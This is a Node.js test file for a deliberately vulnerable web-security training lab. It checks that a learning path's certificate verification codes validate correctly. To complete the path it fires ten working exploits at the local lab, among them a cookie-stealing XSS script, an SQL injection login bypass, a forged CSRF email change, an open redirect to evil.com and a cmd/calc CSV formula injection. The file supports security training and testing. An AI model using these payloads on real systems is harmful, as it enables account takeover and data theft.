'use strict';
// M13 paths certificate verification tests.
//
// The server derives a per-install, per-path verification code:
//   verifyCodeFor(pathId) = 'PTX-' + sha256(installId + ':' + pathId).hex.slice(0,8).toUpperCase()
// and serves GET /paths/:id/verify (the verify form without a code, or a
// valid/invalid verdict with ?code=...) plus GET /paths/:id/certificate for
// students who completed the path.
//
// Coverage:
//   1. GET /paths/zero-to-web-pentester/verify without a code returns 200 and
//      shows the verify form.
//   2. All ten zero-to-web-pentester steps are captured with REAL exploits
//      (the proven exploit per step, taken from that module's own test).
//   3. GET /paths/zero-to-web-pentester/certificate returns 200 after the path
//      is complete.
//   4. GET /paths/zero-to-web-pentester/verify?code=PTX-WRONG01 shows invalid.
//   5. The code recomputed from the test DB's install_id shows valid.
//   6. A code derived from a DIFFERENT install_id shows invalid.
//
// Flag secrecy: no PENTRIX{...} literals anywhere in this file.
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const path = require('node:path');
const vm = require('node:vm');
const { client, bootLab, capturedSet, FLAG_RE } = require('./helpers');

const PATH_ID = 'zero-to-web-pentester';
const PATH_URL = `/paths/${PATH_ID}`;
const q = encodeURIComponent;

// ---------------------------------------------------------------------------
// Browser simulation for the reflected XSS step (same approach as
// tests/xss.test.js: fetch the page, run its live inline scripts and the
// injected payload in a vm sandbox with a stubbed DOM, then deliver the beacon
// the script produced). The stored XSS step uses the victim-bound flow instead
// (plant the payload, drive GET /xss/victim-visit), as tests/xss.test.js does.
// ---------------------------------------------------------------------------
const TAG_RE = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

function liveScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '').replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  TAG_RE.lastIndex = 0;
  let m;
  while ((m = TAG_RE.exec(src))) {
    if (m[1] === '/' || m[2].toLowerCase() !== 'script') continue;
    const i = src.slice(TAG_RE.lastIndex).search(/<\/script/i);
    const end = i >= 0 ? TAG_RE.lastIndex + i : src.length;
    if (!/\bsrc\s*=/.test(m[3])) out.push(src.slice(TAG_RE.lastIndex, end));
    TAG_RE.lastIndex = end;
  }
  return out;
}

function makeBrowser(cookie, { hash = '', search = '' } = {}) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = (id) => (els[id] = els[id] || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
  });
  const ctx = {
    document: { cookie, getElementById: el },
    location: { hash, search },
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => { calls.push('ALERT'); },
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  const run = (code) => {
    try { vm.runInContext(code, ctx, { timeout: 1000 }); } catch (e) { errors.push(e.message); }
  };
  return {
    el, calls, errors, run,
    runPage: (html) => liveScripts(html).forEach(run),
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

async function deliver(c, browser) {
  let last = null;
  for (const url of browser.beacons()) {
    const r = await c.get(url);
    if (r.status === 200) return r;
    last = r;
  }
  return last;
}

const beaconJs = (v, token = 'window.__px') => `fetch('/xss/collect?c='+document.cookie+'&v=${v}&n='+${token})`;

// ---------------------------------------------------------------------------
// Code derivation (mirrors the server-side verifyCodeFor for a given install).
// ---------------------------------------------------------------------------
function expectedCode(installId, pathId) {
  return 'PTX-' + crypto.createHash('sha256').update(installId + ':' + pathId).digest('hex').slice(0, 8).toUpperCase();
}

function installIdFromDb(dataDir) {
  const Database = require('better-sqlite3');
  const db = new Database(path.join(dataDir, 'vulnlab.db'), { readonly: true });
  const row = db.prepare('SELECT value FROM meta WHERE key = ?').get('install_id');
  db.close();
  assert.ok(row, 'install_id row missing in the test database');
  assert.match(row.value, /^[0-9a-f]{32}$/, 'install_id must be 32 hex chars');
  return row.value;
}

// ---------------------------------------------------------------------------
// The ten zero-to-web-pentester steps, each solved with its proven exploit.
// ---------------------------------------------------------------------------
const EXPECTED_CAPTURES = [
  'xss:Reflected XSS',
  'sqli:Login Bypass',
  'idor:Profile IDOR',
  'csrf:Change Email with No CSRF Token (state-changing GET)',
  'misconfig:Verbose Debug Errors',
  'http:Verb Tampering',
  'redirect:Protocol-Relative Redirect',
  'formula:Classic Formula Injection',
  'auth:Username Enumeration',
  'xss:Stored XSS',
];

async function capturePathSteps(c) {
  // 1. xss/reflected: inject a script that beacons with the page token.
  {
    const page = await c.get('/xss/search?q=' + q(`<script>${beaconJs('reflected')}</script>`));
    assert.equal(page.status, 200);
    const b = makeBrowser(c.cookie());
    b.runPage(page.text);
    assert.deepEqual(b.errors, []);
    const r = await deliver(c, b);
    assert.ok(r && r.status === 200, 'reflected XSS beacon must be accepted');
  }

  // 2. sqli/login-bypass: the classic tautology login.
  {
    const r = await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal(r.status, 200);
    assert.equal((r.text.match(FLAG_RE) || []).length, 1, 'login bypass should award exactly one flag');
  }

  // 3. idor/profile: logged in as alice (user 2), read user 1's profile.
  {
    const login = await c.get('/idor/login/alice');
    assert.equal(login.status, 302);
    const hit = await c.get('/idor/users/1');
    assert.equal(hit.status, 200);
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'reading another member profile should award');
  }

  // 4. csrf/email: the forged state-changing GET, no token involved. The
  // foreign Referer is the cross-site evidence; a bare self GET earns nothing.
  {
    await c.get('/csrf/login/alice');
    const hit = await c.get('/csrf/change-email?email=pwned%40evil.com', { referer: 'https://evil.example/cat-pictures' });
    assert.equal(hit.status, 200);
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'forged email change should award');
  }

  // 5. misconfig/debug: the debug page talks too much with ?err=1.
  {
    const hit = await c.get('/misconfig/debug?err=1');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes('ENOENT'), 'verbose stack trace expected');
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'debug output should leak the flag');
  }

  // 6. http/verb-tamper: the same request as GET skips the POST-only check.
  {
    const hit = await c.get('/http/feedback?msg=tampered verb');
    assert.equal(hit.status, 200);
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'GET submission should award');
  }

  // 7. redirect/redirect-double-slash: protocol-relative target passes the filter.
  {
    const hit = await c.get('/redirect/go?next=' + q('//evil.com'));
    assert.equal(hit.status, 302);
    assert.equal(hit.headers.get('location'), '//evil.com');
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'protocol-relative redirect should award');
  }

  // 8. formula/formula-csv: a formula cell smuggled through the CSV export.
  {
    const add = await c.post('/formula/add', { name: "=cmd|' /C calc'!A0", note: 'classic' });
    assert.equal(add.status, 302);
    const exp = await c.get('/formula/export.csv');
    assert.equal(exp.status, 200);
    assert.ok((exp.headers.get('x-flags') || '').match(FLAG_RE), 'export should award via the x-flags header');
  }

  // 9. auth/user-enum: probe the oracle, then submit the confirmed username.
  {
    const probe = await c.post('/auth/enum-login', { username: 'alice', password: 'definitely-wrong' });
    assert.ok(probe.text.includes('Wrong password for user'), 'oracle must confirm the real username');
    const hit = await c.post('/auth/enum-submit', { username: 'alice' });
    assert.equal((hit.text.match(FLAG_RE) || []).length, 1, 'submitting the enumerated username should award');
  }

  // 10. xss/stored: plant the script in the guestbook, then drive the
  // victim-visit flow. Stored XSS is victim-bound: a beacon fired from the
  // attacker own session is rejected by /xss/collect, and the award flows
  // only when the simulated victim loads the guestbook (the same flow
  // tests/xss.test.js uses for its stored exploit).
  {
    const post = await c.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
    assert.equal(post.status, 302, 'planting the stored payload must redirect back to the guestbook');
    const visit = await c.get('/xss/victim-visit');
    assert.equal(visit.status, 200, 'victim visit must succeed');
    assert.ok(visit && visit.status === 200, 'stored XSS victim visit must be accepted');
    assert.equal((visit.text.match(FLAG_RE) || []).length, 1, 'victim visit should award exactly one flag');
  }

  const got = await capturedSet(c);
  for (const name of EXPECTED_CAPTURES) {
    assert.ok(got.includes(name), `path step not captured: ${name}`);
  }
  assert.equal(got.filter((s) => EXPECTED_CAPTURES.includes(s)).length, 10, 'all ten path steps must be captured');
}

// ---------------------------------------------------------------------------
// Verification tests.
// ---------------------------------------------------------------------------
test('paths certificate verification', async (t) => {
  const { srv, dataDir } = await bootLab(t);

  await t.test('verify page renders the form without a code', async () => {
    const c = client(srv.base);
    const r = await c.get(PATH_URL + '/verify');
    assert.equal(r.status, 200, 'GET /paths/:id/verify must return 200');
    assert.ok(/<form\b/i.test(r.text), 'verify page must show a form');
    assert.ok(/name=["']code["']/i.test(r.text), 'verify form must have a code input');
  });

  await t.test('completing the path via real exploits captures all ten steps', async () => {
    const c = client(srv.base);
    await capturePathSteps(c);
  });

  await t.test('certificate renders after path completion', async () => {
    const c = client(srv.base);
    await capturePathSteps(c);
    const r = await c.get(PATH_URL + '/certificate');
    assert.equal(r.status, 200, 'GET /paths/:id/certificate must return 200 after completion');
    assert.ok(r.text.length > 0, 'certificate must render a body');
  });

  await t.test('a wrong code shows invalid', async () => {
    const c = client(srv.base);
    const r = await c.get(PATH_URL + '/verify?code=PTX-WRONG01');
    assert.equal(r.status, 200, 'verify with a wrong code must return 200');
    assert.ok(/invalid/i.test(r.text), 'wrong code must show invalid');
  });

  await t.test('the code derived from this install id shows valid', async () => {
    const c = client(srv.base);
    const installId = installIdFromDb(dataDir);
    const code = expectedCode(installId, PATH_ID);
    assert.match(code, /^PTX-[0-9A-F]{8}$/, 'code format must be PTX-<8 upper hex>');
    const r = await c.get(PATH_URL + '/verify?code=' + code);
    assert.equal(r.status, 200, 'verify with the derived code must return 200');
    assert.ok(!/invalid/i.test(r.text), 'derived code must not show invalid');
    assert.ok(/valid/i.test(r.text), 'derived code must show valid');
    assert.equal((r.text.match(FLAG_RE) || []).length, 0, 'verify page must never leak a flag');
  });

  await t.test('the code is case-insensitive', async () => {
    const c = client(srv.base);
    const installId = installIdFromDb(dataDir);
    const code = expectedCode(installId, PATH_ID).toLowerCase();
    const r = await c.get(PATH_URL + '/verify?code=' + code);
    assert.equal(r.status, 200, 'verify with a lowercase code must return 200');
    assert.ok(!/invalid/i.test(r.text), 'lowercase code must not show invalid');
    assert.ok(/valid/i.test(r.text), 'lowercase code must show valid');
  });

  await t.test('a code derived from a different install id shows invalid', async () => {
    const c = client(srv.base);
    const realId = installIdFromDb(dataDir);
    const otherId = crypto.randomBytes(16).toString('hex');
    assert.notEqual(otherId, realId, 'sanity: the foreign install id must differ');
    const code = expectedCode(otherId, PATH_ID);
    assert.match(code, /^PTX-[0-9A-F]{8}$/);
    const r = await c.get(PATH_URL + '/verify?code=' + code);
    assert.equal(r.status, 200, 'verify with a foreign code must return 200');
    assert.ok(/invalid/i.test(r.text), 'foreign install code must show invalid');
  });

  await t.test('a code minted for another path shows invalid here', async () => {
    const c = client(srv.base);
    const installId = installIdFromDb(dataDir);
    const code = expectedCode(installId, 'api-hacker');
    const r = await c.get(PATH_URL + '/verify?code=' + code);
    assert.equal(r.status, 200, 'verify with a cross-path code must return 200');
    assert.ok(/invalid/i.test(r.text), 'a code minted for api-hacker must not validate on zero-to-web-pentester');
  });
});
